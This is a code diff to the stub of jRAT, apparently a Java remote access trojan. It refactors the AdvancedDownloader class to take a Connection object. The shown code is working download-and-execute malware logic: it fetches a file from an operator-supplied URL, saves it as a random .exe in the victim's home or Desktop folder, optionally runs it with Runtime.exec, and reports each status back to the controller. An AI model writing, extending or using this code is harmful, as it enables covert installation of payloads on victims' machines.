@@ -12,11 +12,13 @@ import se.jrat.stub.packets.outgoing.Packet27URLStatus;
 
 public class AdvancedDownloader extends Thread {
 
+	private Connection con;
 	public String url;
 	public boolean exec;
 	public String drop;
 
-	public AdvancedDownloader(String url, boolean exec, String drop) {
+	public AdvancedDownloader(Connection con, String url, boolean exec, String drop) {
+		this.con = con;
 		this.url = url;
 		this.exec = exec;
 		this.drop = drop;
@@ -24,14 +26,14 @@ public class AdvancedDownloader extends Thread {
 
 	public void run() {
 		try {
-			Connection.instance.addToSendQueue(new Packet27URLStatus(url, "Downloading"));
+			con.addToSendQueue(new Packet27URLStatus(url, "Downloading"));
 			File file = null;
 
-			URLConnection con = new URL(url).openConnection();
+			URLConnection ucon = new URL(url).openConnection();
 
 			String fileName = (new Random().nextInt()) + ".exe";
 
-			String disposition = con.getHeaderField("Content-Disposition");
+			String disposition = ucon.getHeaderField("Content-Disposition");
 
 			if (disposition != null) {
 				int index = disposition.indexOf("filename=");
@@ -59,7 +61,7 @@ public class AdvancedDownloader extends Thread {
 				file = new File(System.getProperty("user.home") + "/Desktop/" + fileName);
 			}
 
-			InputStream in = con.getInputStream();
+			InputStream in = ucon.getInputStream();
 			FileOutputStream fout = new FileOutputStream(file);
 			byte data[] = new byte[1024];
 			int count;
@@ -71,9 +73,9 @@ public class AdvancedDownloader extends Thread {
 
 			if (this.exec) {
 				Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
-				Connection.instance.addToSendQueue(new Packet27URLStatus(url, "Executed"));
+				con.addToSendQueue(new Packet27URLStatus(url, "Executed"));
 			} else {
-				Connection.instance.addToSendQueue(new Packet27URLStatus(url, "Downloaded"));
+				con.addToSendQueue(new Packet27URLStatus(url, "Downloaded"));
 			}
 
 		} catch (Exception ex) {
